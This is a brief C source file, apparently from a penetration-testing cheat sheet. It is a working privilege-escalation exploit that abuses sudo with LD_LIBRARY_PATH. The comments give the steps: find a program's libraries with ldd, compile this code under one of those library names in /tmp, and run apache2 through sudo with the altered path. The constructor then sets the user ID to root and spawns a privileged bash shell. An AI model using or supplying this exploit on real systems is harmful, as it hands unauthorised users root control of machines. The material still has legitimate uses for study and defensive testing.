#include <stdio.h>
#include <stdlib.h>

/* ldd <PROGRAM> */
/* Compile: gcc -o /tmp/<Library name that was listed> -shared -fPIC ./library.c */
/* sudo LD_LIBRARY_PATH=/tmp apache2 */

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}